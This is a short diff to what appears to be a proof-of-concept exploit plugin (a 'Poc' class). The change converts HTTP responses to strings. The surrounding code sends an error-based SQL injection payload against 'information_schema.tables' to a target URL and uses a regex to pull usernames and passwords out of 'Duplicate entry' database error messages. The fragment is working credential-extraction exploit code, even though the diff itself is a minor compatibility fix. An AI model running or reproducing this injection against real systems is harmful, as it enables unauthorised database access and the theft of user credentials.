@@ -63,7 +63,7 @@ class Poc(ABPoc):
                            "information_schema.tables group by x limit 0,1)a)#")
             req = urllib.request.Request(url=verify_url, data=postDataExp)
             response = urllib.request.urlopen(req, timeout=10)
-            content = response.read()
+            content = str(response.read())
             if content != None:
                 pattern = re.compile(
                     r".*?Duplicate\s*entry\s*'\|\$\^(?P<username>[\w]+)->(?P<password>[a-zA-Z0-9]+)")
@@ -90,7 +90,7 @@ class Poc(ABPoc):
                            "information_schema.tables group by x limit 0,1)a)#")
             req = urllib.request.Request(url=verify_url, data=postDataExp)
             response = urllib.request.urlopen(req, timeout=10)
-            content = response.read()
+            content = str(response.read())
             if content != None:
                 pattern = re.compile(
                     r".*?Duplicate\s*entry\s*'\|\$\^(?P<username>[\w]+)->(?P<password>[a-zA-Z0-9]+)")
